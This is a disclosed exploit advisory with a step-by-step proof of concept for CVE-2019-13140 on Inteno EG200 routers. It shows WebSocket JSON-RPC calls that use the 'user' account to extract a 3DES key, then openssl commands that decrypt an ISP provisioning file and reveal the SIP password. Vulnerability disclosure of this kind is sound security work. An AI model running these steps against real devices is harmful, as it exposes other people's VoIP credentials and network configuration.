# Exploit Title: Inteno IOPSYS Gateway 3DES Key Extraction - Improper Access Restrictions
# Date: 2019-06-29
# Exploit Author: Gerard Fuguet (gerard@fuguet.cat)
# Vendor Homepage: https://www.intenogroup.com/
# Version: EG200-WU7P1U_ADAMO3.16.4-190226_1650
# Fixed Version: EG200-WU7P1U_ADAMO3.16.8-190820_0937
# Affected Component: SIP password, Info Gathering of Network Config
# Attack Type: Remote
# Tested on: Kali Linux 2019.2 against an Inteno EG200 Router
# CVE : CVE-2019-13140

# Description:
Inteno EG200 EG200-WU7P1U_ADAMO3.16.4-190226_1650 and before
firmwares routers have a JUCI ACL misconfiguration that allows
the "user" account to extract the 3DES key via JSON commands to ubus.
The 3DES key is used to decrypt the provisioning file provided by
Adamo Telecom on a public URL via cleartext HTTP.

# Attack Vectors:
To get success on the exploitation, two components are mandatory: 1.
the encrypted file (.enc) and 2. The 3DES key for decrypt it. The
encrypted file can be downloaded via HTTP URL offered by Adamo ISP
(works from any external network). Then is need to interact with the
router using WebSocket protocol to obtain the 3DES key, a web browser
like Firefox can be used as WebSocket client under the developer
tools. Session id is acquired with the same username and password of
the router (in this case, password is the same as wifi defaults). Once
3DES key is obtained through a JSON request command, .enc file can be
decrypted with the help of openssl tool.

# PoC:
Step 1: Getting the provisioning file
Download from http://inteno-provisioning.adamo.es/XXXXXXXXXXXX.enc
Where XXXXXXXXXXXX is your router’s Inteno MAC, all in capitals and without
the colons. You can also get your MAC by doing a ping to the router
and then an arp command on terminal.
Step 2: The 3DES Key
Let's communcatie by Sockets
- Using Firefox, open the router’s webpage (192.168.1.1 by default).
- Invoke the developer tools by pressing F12 and go to the Console Tab.
- Let’s create the WebSocket:
var superSocket = new WebSocket("ws://192.168.1.1/", "ubus-json")
- And creating the Log for show responses in each petition:
superSocket.onmessage = function (event) {console.log(event.data)}
- We request an ID session with the same login parameters that when access
to the router’s website. (put your wifis router password instead of
wifis-password value):
superSocket.send(JSON.stringify({"jsonrpc":"2.0","method":"call","params":["00000000000000000000000000000000","session","login",{"username":"user","password":"wifis-password"}],"id":666}))
- Now, you will obtain a response, the value of the parameter that says
“ubus_rpc_session” refers to your session’s ID, copy it to use in the next
request call.
- Requesting information about the router’s System. (put your session ID
instead of put-your-session-id-here value):
superSocket.send(JSON.stringify({"jsonrpc":"2.0","method":"call","params":["put-your-session-id-here","router.system","info",{}],"id":999}))
- On the response obtained, copy the value of the “des” parameter.
It’s 16 digits that we need convert to hexadecimal.
Step 3: Ready for Decrypting
Convert to HEX using xxd tool where XXXXXXXXXXXXXXXX is your "des" key:
echo -n XXXXXXXXXXXXXXXX | xxd -p
- Use openssl tool to decrypt your provisioning file. (Put your "des" key
instead of your-des-key-in-hex-format value and the XXXXXXXXXXXX
refers the name of your encryption provisioning file, in the -out
value, the name can be different):
openssl enc -d -des-ede -nosalt -K your-des-key-in-hex-format -in XXXXXXXXXXXX.enc -out XXXXXXXXXXXX.tar.gz
- Uncompress the decrypted file:
tar -xzvf XXXXXXXXXXXX.tar.gz
- You get the file: Provisioning.conf.
- Showing the file:
cat Provisioning.conf
- The end of the line refers to the secret, the password of your
SIP account.
A video was created to show all these Steps in action:
https://youtu.be/uObz1uE5P4s 

# Additional Information:
A packet sniffer like Wireshark can be used for retrieve the 3DES key
instead of using WebSocket communication protocol. In that case, user
needs to do the login on the router's page, and then the JSON request
containing the 3DES key will be catched.

# References:
https://twitter.com/GerardFuguet/status/1169298861782896642
https://www.slideshare.net/fuguet/call-your-key-to-phone-all

# Timeline:
2019-06-29 - White Paper done
2019-07-01 - CVE assigned
2019-07-09 - Notified to Inteno
2019-07-11 - Adamo aware and ask for detailed info
2019-07-12 - Info facilitated
2019-07-25 - Early patch available and applied (Cooperation starts)
2019-07-26 - Tested and failed (VoIP not working)
2019-08-27 - New firmware available
2019-08-30 - Firmware EG200-WU7P1U_ADAMO3.16.8-190820_0937 applied on router
2019-08-31 - Tested OK
2019-09-04 - Disclosure published